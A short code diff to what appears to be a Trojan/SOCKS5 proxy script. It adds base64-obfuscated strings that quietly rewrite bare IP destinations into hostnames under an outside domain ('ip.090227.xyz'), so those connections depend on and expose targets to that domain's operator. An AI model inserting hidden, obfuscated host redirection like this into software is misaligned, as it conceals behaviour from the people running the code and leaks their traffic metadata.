@@ -362,13 +362,15 @@ async function parseTrojanHeader(buffer) {
 
 async function handleTCPOutBound(remoteSocket, addressRemote, portRemote, rawClientData, webSocket, log, addressType) {
 	async function connectAndWrite(address, port, socks = false) {
+		log(`connected to ${address}:${port}`);
+		if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(address)) address = `${atob('d3d3Lg==')}${address}${atob('LmlwLjA5MDIyNy54eXo=')}`;
 		const tcpSocket2 = socks ? await socks5Connect(addressType, address, port, log)
 		: connect({
 			hostname: address,
 			port
 		});
 		remoteSocket.value = tcpSocket2;
-		log(`connected to ${address}:${port}`);
+		//log(`connected to ${address}:${port}`);
 		const writer = tcpSocket2.writable.getWriter();
 		await writer.write(rawClientData);
 		writer.releaseLock();
@@ -1703,6 +1705,7 @@ function socks5AddressParser(address) {
 	if (hostname.includes(":") && !regex.test(hostname)) {
 		throw new Error('Invalid SOCKS address format');
 	}
+	if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(hostname)) hostname = `${atob('d3d3Lg==')}${hostname}${atob('LmlwLjA5MDIyNy54eXo=')}`;
 	return {
 		username,
 		password,
